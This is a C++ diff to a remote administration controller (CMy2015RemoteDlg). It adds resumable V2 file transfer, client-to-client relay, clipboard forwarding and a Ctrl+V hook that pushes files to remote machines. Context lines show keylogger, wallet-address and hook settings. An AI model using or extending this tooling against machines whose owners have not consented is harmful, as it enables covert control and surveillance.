@@ -103,6 +103,20 @@ int g_Column_Message_Width = 0;
 
 CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;
 
+// 服务端待续传传输状态
+std::map<uint64_t, PendingTransferV2> g_pendingTransfersV2;
+std::mutex g_pendingTransfersV2Mtx;
+
+// 检查客户端是否支持 V2 文件传输协议
+bool SupportsFileTransferV2(context* ctx) {
+    if (!g_2015RemoteDlg || !g_2015RemoteDlg->m_bEnableFileV2) return false;
+    if (!ctx) return false;
+    // 优先使用能力位检测（新客户端），回退到版本日期检测（旧客户端）
+    if (ctx->SupportsFileV2()) return true;
+    CString version = ctx->GetClientData(ONLINELIST_VERSION);
+    return IsDateGreaterOrEqual(version, FILE_TRANSFER_V2_DATE);
+}
+
 static UINT Indicators[] = {
     IDR_STATUSBAR_STRING
 };
@@ -577,6 +591,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
     ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
     ON_COMMAND(ID_PARAM_PRIVACY_WALLPAPER, &CMy2015RemoteDlg::OnParamPrivacyWallpaper)
+    ON_COMMAND(ID_PARAM_FILE_V2, &CMy2015RemoteDlg::OnParamFileV2)
     ON_COMMAND(ID_PROXY_PORT, &CMy2015RemoteDlg::OnProxyPort)
     ON_COMMAND(ID_HOOK_WIN, &CMy2015RemoteDlg::OnHookWin)
     ON_COMMAND(ID_RUNAS_SERVICE, &CMy2015RemoteDlg::OnRunasService)
@@ -770,9 +785,18 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 
     CString install = v[RES_INSTALL_TIME].empty() ? "?" : v[RES_INSTALL_TIME].c_str();
     CString path = v[RES_FILE_PATH].empty() ? "?" : v[RES_FILE_PATH].c_str();
+
+    // 解析版本字符串: "Feb 26 2026-XXXX" -> 版本="Feb 26 2026", 能力="XXXX"
+    CString verDisplay = ver, capStr;
+    int dashPos = ver.Find('-');
+    if (dashPos > 0) {
+        verDisplay = ver.Left(dashPos);
+        capStr = ver.Mid(dashPos + 1);
+    }
+
     CString data[ONLINELIST_MAX] = { strIP, strAddr, "", strPCName, strOS, strCPU, strVideo, strPing,
-                                     ver, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path,
-                                     v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(), startTime,
+                                     verDisplay, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path,
+                                     v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(), startTime, capStr,
                                    };
     auto id = CONTEXT_OBJECT::CalculateID(data);
     auto id_str = std::to_string(id);
@@ -1315,11 +1339,13 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     memcpy(m_settings.WalletAddress, w.c_str(), w.length());
     m_settings.EnableKBLogger = THIS_CFG.GetInt("settings", "KeyboardLog", 0);
     m_settings.EnableLog = THIS_CFG.GetInt("settings", "EnableLog", 0);
+    m_bEnableFileV2 = THIS_CFG.GetInt("settings", "EnableFileV2", 0) != 0;
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
     SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     m_needNotify = THIS_CFG.GetInt("settings", "LoginNotify", 0);
     SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
     SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
+    SubMenu->CheckMenuItem(ID_PARAM_FILE_V2, m_bEnableFileV2 ? MF_CHECKED : MF_UNCHECKED);
     m_bHookWIN = THIS_CFG.GetInt("settings", "HookWIN", 0);
     SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
     m_runNormal = THIS_CFG.GetInt("settings", "RunNormal", 0);
@@ -2566,7 +2592,21 @@ bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
     CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
     if (!dlg) return false;
     BYTE* name = data + sizeof(FileChunkPacket);
-    dlg->UpdateProgress(CString((char*)name, chunk->nameLength), chunk);
+    dlg->UpdateProgress(CString((char*)name, chunk->nameLength), FileProgressInfo(chunk));
+
+    return true;
+}
+
+bool SendDataV2(void* user, FileChunkPacketV2* chunk, BYTE* data, int size)
+{
+    CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)user;
+    if (!ctx->Send2Client(data, size)) {
+        return false;
+    }
+    CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
+    if (!dlg) return false;
+    BYTE* name = data + sizeof(FileChunkPacketV2);
+    dlg->UpdateProgress(CString((char*)name, (int)chunk->nameLength), FileProgressInfo(chunk));
 
     return true;
 }
@@ -2765,6 +2805,288 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         DialogBase* dlg = (DialogBase*)ContextObject->hDlg;
         dlg->OnReceiveComplete();
 
+        break;
+    }
+    case COMMAND_SEND_FILE_V2: {
+        // V2 文件传输（支持 C2C）
+        FileChunkPacketV2* pkt = (FileChunkPacketV2*)szBuffer;
+
+        if (pkt->dstClientID == 0) {
+            // 目标是主控端：本地接收
+            if (ContextObject->hDlg == NULL) {
+                CDlgFileSend* dlg = new CDlgFileSend(this, ContextObject->GetServer(), ContextObject, FALSE);
+                dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+                dlg->ShowWindow(SW_HIDE);
+                ContextObject->hDlg = dlg;
+                ContextObject->hWnd = dlg->GetSafeHwnd();
+            }
+            // OnReceiveComplete() 会根据 cmd 字节自动判断 V1/V2
+            DialogBase* dlg = (DialogBase*)ContextObject->hDlg;
+            dlg->OnReceiveComplete();
+        } else {
+            // C2C：转发到目标客户端
+            context* dstCtx = FindHost(pkt->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+
+                // 获取或创建进度对话框（和客户端->服务端相同方式）
+                if (ContextObject->hDlg == NULL) {
+                    CDlgFileSend* dlg = new CDlgFileSend(this, ContextObject->GetServer(), ContextObject, FALSE);
+                    dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+                    dlg->ShowWindow(SW_SHOW);
+                    dlg->SetWindowText(_TR("C2C 文件传输"));
+                    ContextObject->hDlg = dlg;
+                    ContextObject->hWnd = dlg->GetSafeHwnd();
+                }
+
+                // 更新进度
+                CDlgFileSend* dlg = (CDlgFileSend*)ContextObject->hDlg;
+                if (dlg && dlg->GetSafeHwnd()) {
+                    CString fileName((char*)(pkt + 1), pkt->nameLength);
+                    FileProgressInfo info(pkt);
+                    dlg->UpdateProgress(fileName, info);
+
+                    // 最后一个文件的最后一个包
+                    if (pkt->fileIndex + 1 == pkt->totalFiles &&
+                        pkt->offset + pkt->dataLength >= pkt->fileSize) {
+                        dlg->FinishFileSend(TRUE);
+                    }
+                }
+            } else {
+                Mprintf("[V2] C2C 转发失败: 目标 %llu 不在线\n", pkt->dstClientID);
+            }
+        }
+        break;
+    }
+    case COMMAND_FILE_RESUME: {
+        // V2 断点续传控制
+        // 注意：有两种格式的包共用此命令:
+        // - FileResumePacketV2 (49+ bytes): 单文件续传请求/响应
+        // - FileResumeResponseV2 (23+ bytes): 批量续传查询响应
+        // 通过包大小区分
+
+        if (len >= sizeof(FileResumePacketV2)) {
+            // 大包: 按 FileResumePacketV2 解析
+            FileResumePacketV2* pkt = (FileResumePacketV2*)szBuffer;
+
+            if (pkt->dstClientID == 0) {
+                // 目标是主控端 - 客户端请求续传到主控端
+                Mprintf("[V2] 收到断点续传请求: transferID=%llu, flags=0x%04X\n", pkt->transferID, pkt->flags);
+
+                if (pkt->flags & FFV2_RESUME_REQ) {
+                    // 客户端询问：你收到了多少？
+                    // 获取本地接收状态并发送响应
+                    TransferStateInfo info;
+                    if (GetTransferState(pkt->transferID, pkt->fileIndex, info)) {
+                        // 构建 RESUME_RESP 包
+                        size_t rangeDataSize = info.receivedRanges.size() * sizeof(FileRangeV2);
+                        size_t totalSize = sizeof(FileResumePacketV2) + rangeDataSize;
+                        std::vector<uint8_t> respBuf(totalSize);
+
+                        FileResumePacketV2* resp = (FileResumePacketV2*)respBuf.data();
+                        resp->cmd = COMMAND_FILE_RESUME;
+                        resp->transferID = pkt->transferID;
+                        resp->srcClientID = 0;  // 主控端
+                        resp->dstClientID = pkt->srcClientID;  // 回复给请求方
+                        resp->fileIndex = pkt->fileIndex;
+                        resp->fileSize = info.fileSize;
+                        resp->receivedBytes = info.receivedBytes;
+                        resp->flags = FFV2_RESUME_RESP;
+                        resp->rangeCount = (uint16_t)info.receivedRanges.size();
+
+                        // 写入区间数据
+                        FileRangeV2* ranges = (FileRangeV2*)(respBuf.data() + sizeof(FileResumePacketV2));
+                        for (size_t i = 0; i < info.receivedRanges.size(); i++) {
+                            ranges[i].offset = info.receivedRanges[i].first;
+                            ranges[i].length = info.receivedRanges[i].second;
+                        }
+
+                        ContextObject->Send2Client((LPBYTE)respBuf.data(), (int)totalSize);
+                        Mprintf("[V2] 已发送续传响应: received=%llu/%llu, ranges=%zu\n",
+                            info.receivedBytes, info.fileSize, info.receivedRanges.size());
+                    } else {
+                        // 没有找到传输状态，可能是全新传输或已完成
+                        Mprintf("[V2] 未找到传输状态: transferID=%llu\n", pkt->transferID);
+                        // 发送空响应，表示需要从头开始
+                        FileResumePacketV2 resp = {};
+                        resp.cmd = COMMAND_FILE_RESUME;
+                        resp.transferID = pkt->transferID;
+                        resp.srcClientID = 0;
+                        resp.dstClientID = pkt->srcClientID;
+                        resp.fileIndex = pkt->fileIndex;
+                        resp.fileSize = 0;
+                        resp.receivedBytes = 0;
+                        resp.flags = FFV2_RESUME_RESP;
+                        resp.rangeCount = 0;
+                        ContextObject->Send2Client((LPBYTE)&resp, sizeof(resp));
+                    }
+                }
+                else if (pkt->flags & FFV2_CANCEL) {
+                    // 取消传输
+                    CleanupResumeState(pkt->transferID);
+                    Mprintf("[V2] 传输已取消: transferID=%llu\n", pkt->transferID);
+                }
+            } else if (pkt->srcClientID == 0 && (pkt->flags & FFV2_RESUME_REQ)) {
+                // 服务端是源 - 客户端请求续传服务端发送的文件
+                Mprintf("[V2] 收到服务端->客户端续传请求: transferID=%llu, received=%llu/%llu\n",
+                    pkt->transferID, pkt->receivedBytes, pkt->fileSize);
+                HandleFileResumeRequest(ContextObject, szBuffer, len);
+            } else {
+                // 转发到目标客户端
+                context* dstCtx = FindHost(pkt->dstClientID);
+                if (dstCtx) {
+                    dstCtx->Send2Client(szBuffer, len);
+                    Mprintf("[V2] 转发续传包: transferID=%llu -> %llu\n", pkt->transferID, pkt->dstClientID);
+                } else {
+                    Mprintf("[V2] 续传目标不在线: %llu\n", pkt->dstClientID);
+                }
+            }
+        } else if (len >= sizeof(FileResumeResponseV2)) {
+            // 小包: 按 FileResumeResponseV2 解析（批量续传查询响应）
+            FileResumeResponseV2* resp = (FileResumeResponseV2*)szBuffer;
+
+            if (resp->dstClientID == 0) {
+                // 目标是服务端 - 处理客户端的续传响应
+                Mprintf("[V2] 收到客户端续传响应: %u 个文件, srcClientID=%llu\n", resp->fileCount, resp->srcClientID);
+
+                // 解析响应条目
+                std::map<uint32_t, uint64_t> offsets;
+                const uint8_t* ptr = szBuffer + sizeof(FileResumeResponseV2);
+                const uint8_t* end = szBuffer + len;
+                for (uint32_t i = 0; i < resp->fileCount && ptr + sizeof(FileResumeResponseEntryV2) <= end; i++) {
+                    const FileResumeResponseEntryV2* entry = (const FileResumeResponseEntryV2*)ptr;
+                    if (entry->receivedBytes > 0) {
+                        offsets[entry->fileIndex] = entry->receivedBytes;
+                        Mprintf("[V2] 文件 %u: 已接收 %llu 字节\n", entry->fileIndex, entry->receivedBytes);
+                    }
+                    ptr += sizeof(FileResumeResponseEntryV2);
+                }
+
+                // 设置全局续传偏移
+                SetPendingResumeOffsets(offsets);
+            } else {
+                // 转发到目标客户端
+                context* dstCtx = FindHost(resp->dstClientID);
+                if (dstCtx) {
+                    dstCtx->Send2Client(szBuffer, len);
+                    Mprintf("[V2] 转发续传响应: -> %llu, %u 个文件\n", resp->dstClientID, resp->fileCount);
+                } else {
+                    Mprintf("[V2] 续传响应目标不在线: %llu\n", resp->dstClientID);
+                }
+            }
+        } else {
+            Mprintf("[V2] 续传包大小无效: %u\n", len);
+        }
+        break;
+    }
+    case COMMAND_C2C_PREPARE_RESP: {
+        // C2C 准备响应（返回目标目录给发送方）
+        if (len < sizeof(C2CPrepareRespPacket)) break;
+        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)szBuffer;
+
+        if (resp->srcClientID == 0) {
+            // 目标是主控端 - 本地处理（M2C 传输，保存目标目录）
+            uint16_t pathLen = resp->pathLength;
+            if (len >= sizeof(C2CPrepareRespPacket) + pathLen) {
+                std::string targetDir((const char*)szBuffer + sizeof(C2CPrepareRespPacket), pathLen);
+                Mprintf("[V2] 收到目标目录响应: transferID=%llu, dir=%s\n", resp->transferID, targetDir.c_str());
+                // M2C 传输时主控端是发送方，保存目标目录用于续传查询
+                // 转换 UTF-8 为宽字符存入全局 map
+                int wlen = MultiByteToWideChar(CP_UTF8, 0, targetDir.c_str(), -1, nullptr, 0);
+                std::wstring wideDir(wlen - 1, 0);
+                MultiByteToWideChar(CP_UTF8, 0, targetDir.c_str(), -1, &wideDir[0], wlen);
+                SetSenderTargetFolder(resp->transferID, wideDir);
+            }
+        } else {
+            // C2C - 转发到源客户端
+            context* srcCtx = FindHost(resp->srcClientID);
+            if (srcCtx) {
+                srcCtx->Send2Client(szBuffer, len);
+                Mprintf("[V2] 转发目标目录响应: -> srcClient=%llu\n", resp->srcClientID);
+            } else {
+                Mprintf("[V2] 目标目录响应：源客户端不在线: %llu\n", resp->srcClientID);
+            }
+        }
+        break;
+    }
+    case COMMAND_FILE_QUERY_RESUME: {
+        // V2 续传查询（基于文件特征匹配）
+        FileQueryResumeV2* query = (FileQueryResumeV2*)szBuffer;
+
+        if (query->dstClientID == 0) {
+            // 目标是主控端 - 本地处理
+            auto response = HandleResumeQuery((const char*)szBuffer, len);
+            if (!response.empty()) {
+                ContextObject->Send2Client((LPBYTE)response.data(), (int)response.size());
+                Mprintf("[V2] 已响应续传查询: %zu 字节\n", response.size());
+            }
+        } else {
+            // C2C - 转发到目标客户端
+            context* dstCtx = FindHost(query->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+                Mprintf("[V2] 转发续传查询: -> %llu\n", query->dstClientID);
+            } else {
+                Mprintf("[V2] 续传查询目标不在线: %llu\n", query->dstClientID);
+            }
+        }
+        break;
+    }
+    case COMMAND_CLIPBOARD_V2: {
+        // V2 剪贴板请求（C2C 触发）
+        // 注意：C2C_PREPARE 已由 Ctrl+V 处理器发送，此处仅需转发
+        ClipboardRequestV2* req = (ClipboardRequestV2*)szBuffer;
+        Mprintf("[V2] C2C 剪贴板请求: src=%llu, dst=%llu, transferID=%llu\n",
+            req->srcClientID, req->dstClientID, req->transferID);
+
+        // 仅转发到源客户端（如果是从 Ctrl+V 处理器直接发送给远程桌面会话的，
+        // 这里不会执行；如果是其他路径，这里会转发）
+        context* srcCtx = FindHost(req->srcClientID);
+        if (srcCtx) {
+            srcCtx->Send2Client(szBuffer, len);
+        }
+        break;
+    }
+    case COMMAND_C2C_TEXT: {
+        // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+        if (len < 13) break;  // 最小包长度
+        uint64_t dstClientID;
+        uint32_t textLen;
+        memcpy(&dstClientID, szBuffer + 1, 8);
+        memcpy(&textLen, szBuffer + 9, 4);
+
+        Mprintf("[C2C] 文本转发: -> %llu (%u 字节)\n", dstClientID, textLen);
+
+        // 转发到目标客户端
+        context* dstCtx = FindHost(dstClientID);
+        if (dstCtx) {
+            dstCtx->Send2Client(szBuffer, len);
+        } else {
+            Mprintf("[C2C] 文本目标不在线: %llu\n", dstClientID);
+        }
+        break;
+    }
+    case COMMAND_FILE_COMPLETE_V2: {
+        // V2 文件完成校验
+        if (len < sizeof(FileCompletePacketV2)) break;
+        FileCompletePacketV2* pkt = (FileCompletePacketV2*)szBuffer;
+
+        if (pkt->dstClientID == 0) {
+            // 目标是主控端：本地校验
+            bool verifyOk = HandleFileCompleteV2((char*)szBuffer, len, 0);
+            Mprintf("[V2] 文件校验%s: transferID=%llu, fileIndex=%u\n",
+                verifyOk ? "通过" : "失败", pkt->transferID, pkt->fileIndex);
+        } else {
+            // C2C：转发到目标客户端
+            context* dstCtx = FindHost(pkt->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+                Mprintf("[V2] 转发校验包: -> %llu, transferID=%llu\n",
+                    pkt->dstClientID, pkt->transferID);
+            } else {
+                Mprintf("[V2] 校验包目标不在线: %llu\n", pkt->dstClientID);
+            }
+        }
         break;
     }
     case TOKEN_GETVERSION: { // 获取版本【L】
@@ -3226,6 +3548,247 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx, const MasterSetti
         }
         LeaveCriticalSection(&m_cs);
     }
+}
+
+// V2 文件发送到客户端：回调数据结构
+struct SendV2CallbackData {
+    uint64_t clientID;  // 用客户端ID而不是指针，因为context可能被复用
+    CDlgFileSend* dlg;
+};
+
+// V2 文件发送到客户端的回调函数
+static bool SendFileChunkToClientV2(void* user, FileChunkPacketV2* chunk, unsigned char* data, int size)
+{
+    SendV2CallbackData* cbData = (SendV2CallbackData*)user;
+    if (!cbData) return false;
+
+    // 通过ID查找客户端，检查是否仍然在线
+    context* ctx = g_2015RemoteDlg->FindHost(cbData->clientID);
+    if (!ctx) {
+        Mprintf("【V2传输】 客户端已断开，停止传输\n");
+        return false;
+    }
+
+    // 发送数据
+    BOOL sent = ctx->Send2Client(data, size);
+
+    // FILE_COMPLETE_V2 包结构不同，跳过进度更新
+    if (data[0] == COMMAND_FILE_COMPLETE_V2) {
+        Mprintf("【V2传输】 发送校验包\n");
+        return sent != FALSE;
+    }
+
+    // 更新进度
+    if (cbData->dlg && chunk) {
+        BYTE* name = data + sizeof(FileChunkPacketV2);
+        CString fileName((char*)name, (int)chunk->nameLength);
+        cbData->dlg->UpdateProgress(fileName, FileProgressInfo(chunk));
+    }
+
+    return sent != FALSE;
+}
+
+void CMy2015RemoteDlg::SendFilesToClientV2(context* mainCtx, const std::vector<std::string>& files)
+{
+    if (!mainCtx || files.empty()) return;
+
+    uint64_t clientID = mainCtx->GetClientID();
+
+    // 检查是否有未完成的相同传输（复用 transferID 实现续传）
+    uint64_t existingTransferID = 0;
+    {
+        std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+        for (auto& pair : g_pendingTransfersV2) {
+            if (pair.second.clientID == clientID && pair.second.files == files) {
+                existingTransferID = pair.first;
+                Mprintf("【V2传输】 找到未完成传输, 复用 transferID=%llu\n", existingTransferID);
+                break;
+            }
+        }
+    }
+
+    if (existingTransferID) {
+        // 复用已有的 transferID，无需等待客户端响应偏移（客户端会通过 COMMAND_FILE_QUERY_RESUME 回复）
+        SendFilesToClientV2Internal(mainCtx, files, existingTransferID, {});
+    } else {
+        SendFilesToClientV2Internal(mainCtx, files, 0, {});
+    }
+}
+
+// 内部实现，支持断点续传
+void CMy2015RemoteDlg::SendFilesToClientV2Internal(context* mainCtx, const std::vector<std::string>& files,
+    uint64_t resumeTransferID, const std::map<uint32_t, uint64_t>& startOffsets)
+{
+    if (!mainCtx || files.empty()) return;
+
+    // 续传使用原transferID，新传输生成新ID
+    uint64_t transferID = resumeTransferID ? resumeTransferID : GenerateTransferID();
+    CONTEXT_OBJECT* ctxObj = dynamic_cast<CONTEXT_OBJECT*>(mainCtx);
+
+    // 创建进度对话框
+    CDlgFileSend* dlg = nullptr;
+    if (ctxObj) {
+        dlg = new CDlgFileSend(this, ctxObj->GetServer(), ctxObj, TRUE);
+        dlg->m_bKeepConnection = TRUE;  // V2传输使用主连接，关闭对话框时不断开
+        dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+        dlg->ShowWindow(SW_HIDE);  // 首次显示由 UpdateProgress 触发
+        dlg->SetWindowTextA(resumeTransferID ? _TR("续传文件 (V2)") : _TR("发送文件 (V2)"));
+    }
+
+    // 保存客户端ID（用于后续查找，因为context可能被复用）
+    uint64_t clientID = mainCtx->GetClientID();
+
+    // 保存传输状态（用于断点续传）
+    if (!resumeTransferID) {
+        std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+        g_pendingTransfersV2[transferID] = { clientID, files, GetTickCount() };
+        Mprintf("【V2传输】 保存传输状态, transferID=%llu, files=%zu\n", transferID, files.size());
+    }
+
+    // 先通知客户端准备接收（捕获当前目录）- 续传时不需要
+    if (!resumeTransferID) {
+        C2CPreparePacket prepare = {};
+        prepare.cmd = COMMAND_C2C_PREPARE;
+        prepare.transferID = transferID;
+        prepare.srcClientID = 0;  // 主控端
+        mainCtx->Send2Client((BYTE*)&prepare, sizeof(prepare));
+        Mprintf("【V2传输】 通知客户端准备, transferID=%llu\n", transferID);
+    }
+
+    // 续传时先发送查询
+    if (resumeTransferID) {
+        // 构建续传查询包
+        std::vector<std::pair<std::string, uint64_t>> fileInfos;
+        for (const auto& f : files) {
+            WIN32_FILE_ATTRIBUTE_DATA fad;
+            if (GetFileAttributesExA(f.c_str(), GetFileExInfoStandard, &fad)) {
+                uint64_t size = ((uint64_t)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
+                // 提取文件名（不含路径）
+                size_t pos = f.find_last_of("\\/");
+                std::string name = (pos != std::string::npos) ? f.substr(pos + 1) : f;
+                fileInfos.push_back({name, size});
+            }
+        }
+        auto queryPkt = BuildResumeQuery(transferID, 0, clientID, fileInfos);
+        if (!queryPkt.empty()) {
+            mainCtx->Send2Client(queryPkt.data(), (UINT)queryPkt.size());
+            Mprintf("【V2传输】 发送续传查询, transferID=%llu, files=%zu\n", transferID, fileInfos.size());
+        }
+    }
+
+    // 在新线程中发送文件
+    std::thread([this, clientID, files, transferID, dlg, startOffsets, resumeTransferID]() {
+        // 等待客户端准备/响应
+        if (resumeTransferID) {
+            Sleep(500);  // 等待续传响应
+        } else {
+            Sleep(200);  // 等待 COMMAND_C2C_PREPARE 处理完成
+        }
+
+        // 检查客户端是否还在线
+        context* ctx = FindHost(clientID);
+        if (!ctx) {
+            Mprintf("【V2传输】 客户端已断开，取消传输\n");
+            if (dlg) dlg->FinishFileSend(FALSE);
+            return;
+        }
+
+        // 获取续传偏移（从全局状态）
+        std::map<uint32_t, uint64_t> offsets = startOffsets;
+        if (resumeTransferID && offsets.empty()) {
+            // 尝试获取客户端响应的偏移
+            if (WaitForResumeOffsets(offsets, 2500)) {
+                Mprintf("【V2传输】 收到续传偏移: %zu 个文件\n", offsets.size());
+            } else {
+                Mprintf("【V2传输】 未收到续传偏移，从头开始\n");
+            }
+        }
+
+        std::string hash = GetPwdHash();
+        std::string hmac = GetHMAC(100);
+
+        TransferOptionsV2 opts = {};
+        opts.transferID = transferID;
+        opts.srcClientID = 0;  // 服务端
+        opts.dstClientID = clientID;
+        opts.enableResume = false;  // 已手动处理
+        opts.startOffsets = offsets;
+
+        // 使用包含对话框的回调数据（用clientID而不是指针）
+        SendV2CallbackData cbData = { clientID, dlg };
+        int result = FileBatchTransferWorkerV2(files, "", &cbData, SendFileChunkToClientV2, nullptr, hash, hmac, opts);
+
+        // 检查最终结果：传输函数返回0且客户端仍在线才算成功
+        bool success = (result == 0) && (FindHost(clientID) != nullptr);
+        Mprintf("【V2传输】 %s, transferID=%llu, result=%d\n", success ? "完成" : "失败", transferID, result);
+
+        // 传输完成，清理状态
+        if (success) {
+            std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+            g_pendingTransfersV2.erase(transferID);
+        }
+
+        // 通知完成
+        if (dlg) {
+            dlg->FinishFileSend(success);
+        }
+    }).detach();
+}
+
+// 处理客户端的续传请求（服务端是源）
+void CMy2015RemoteDlg::HandleFileResumeRequest(CONTEXT_OBJECT* ctx, const BYTE* data, size_t len)
+{
+    if (len < sizeof(FileResumePacketV2)) {
+        Mprintf("[V2续传] 请求包太短: %zu\n", len);
+        return;
+    }
+
+    const FileResumePacketV2* pkt = (const FileResumePacketV2*)data;
+    uint64_t transferID = pkt->transferID;
+    uint64_t clientID = pkt->dstClientID;
+
+    // 查找待续传的传输
+    PendingTransferV2 transfer;
+    {
+        std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+        auto it = g_pendingTransfersV2.find(transferID);
+        if (it == g_pendingTransfersV2.end()) {
+            Mprintf("[V2续传] 未找到传输记录: transferID=%llu\n", transferID);
+            return;
+        }
+        transfer = it->second;
+    }
+
+    // 验证客户端ID
+    if (transfer.clientID != clientID) {
+        Mprintf("[V2续传] 客户端ID不匹配: 期望=%llu, 实际=%llu\n", transfer.clientID, clientID);
+        return;
+    }
+
+    // 解析已接收的区间，计算起始偏移
+    std::map<uint32_t, uint64_t> startOffsets;
+
+    // 从请求中获取 receivedBytes 作为起始偏移
+    // 注意：当前实现简化为单文件，使用 receivedBytes 作为偏移
+    uint32_t fileIndex = pkt->fileIndex;
+    uint64_t receivedBytes = pkt->receivedBytes;
+
+    if (receivedBytes > 0) {
+        startOffsets[fileIndex] = receivedBytes;
+        Mprintf("[V2续传] 文件 %u 从偏移 %llu 开始续传\n", fileIndex, receivedBytes);
+    }
+
+    // 获取当前客户端的 context（可能已经是新的连接）
+    context* mainCtx = FindHost(clientID);
+    if (!mainCtx) {
+        Mprintf("[V2续传] 客户端不在线: %llu\n", clientID);
+        return;
+    }
+
+    Mprintf("[V2续传] 开始续传: transferID=%llu, files=%zu\n", transferID, transfer.files.size());
+
+    // 调用内部函数开始续传
+    SendFilesToClientV2Internal(mainCtx, transfer.files, transferID, startOffsets);
 }
 
 bool isAllZeros(const BYTE* data, int len)
@@ -4813,6 +5376,8 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
     if (nCode == HC_ACTION) {
         do {
             static CDialogBase* operateWnd = nullptr;
+			static time_t localCtrlCTime = 0;
+			static std::vector<std::string> fileList;
             KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
             // 先判断是否需要处理的热键
             bool bNeedCheck = false;
@@ -4885,17 +5450,26 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
             // 只在按下时处理
             if (wParam == WM_KEYDOWN) {
                 // 检测 Ctrl+C / Ctrl+X
+                static time_t remoteCtrlCTime = 0;  // C2C: 远程 Ctrl+C 时间
                 if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (pKey->vkCode == 'C' || pKey->vkCode == 'X')) {
                     HWND hFore = ::GetForegroundWindow();
                     operateWnd = g_2015RemoteDlg->GetRemoteWindow(hFore);
-                    if (!operateWnd)
+                    if (!operateWnd) {
+                        localCtrlCTime = time(nullptr);
+                        remoteCtrlCTime = 0;  // 清除远程 Ctrl+C 时间
+                        int r=0;
+						fileList = GetForegroundSelectedFiles(r);
                         g_2015RemoteDlg->UpdateActiveRemoteSession(nullptr);
+                    } else {
+                        remoteCtrlCTime = time(nullptr);  // 记录远程 Ctrl+C 时间
+                        localCtrlCTime = 0;  // 清除本地 Ctrl+C 时间
+                    }
                 }
                 // 检测 Ctrl+V
                 else if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && pKey->vkCode == 'V') {
                     HWND hFore = ::GetForegroundWindow();
                     CDialogBase* dlg = g_2015RemoteDlg->GetRemoteWindow(hFore);
-                    if (dlg) {
+                    if (dlg && (time(nullptr) - localCtrlCTime < 60)) {
                         if (dlg == operateWnd)break;
                         auto screen = (CScreenSpyDlg*)dlg;
                         if (!screen->m_bIsCtrl) {
@@ -4905,21 +5479,31 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                         // [1] 本地 -> 远程
                         int result;
                         auto files = GetClipboardFiles(result);
-                        if (files.empty()) files = GetForegroundSelectedFiles(result);
+                        if (files.empty()) files = fileList;
                         if (!files.empty()) {
-                            // 获取远程目录
-                            auto str = BuildMultiStringPath(files);
-                            BYTE* szBuffer = new BYTE[81 + str.size()];
-                            szBuffer[0] = { COMMAND_GET_FOLDER };
-                            std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
-                            memcpy((char*)szBuffer + 1, masterId.c_str(), masterId.length());
-                            memcpy((char*)szBuffer + 1 + masterId.length(), hmac.c_str(), hmac.length());
-                            memcpy(szBuffer + 1 + 80, str.data(), str.size());
-                            auto md5 = CalcMD5FromBytes((BYTE*)str.data(), str.size());
-                            g_2015RemoteDlg->m_CmdList.PutCmd(md5);
-                            dlg->m_ContextObject->Send2Client(szBuffer, 81 + str.size());
-                            SAFE_DELETE_ARRAY(szBuffer);
-                            Mprintf("【Ctrl+V】 从本地拷贝文件到远程: %s \n", md5.c_str());
+                            // 检查客户端是否支持 V2
+                            uint64_t clientID = screen->GetClientID();
+                            context* mainCtx = g_2015RemoteDlg->FindHost(clientID);
+
+                            if (mainCtx && SupportsFileTransferV2(mainCtx)) {
+                                // V2 传输
+                                g_2015RemoteDlg->SendFilesToClientV2(mainCtx, files);
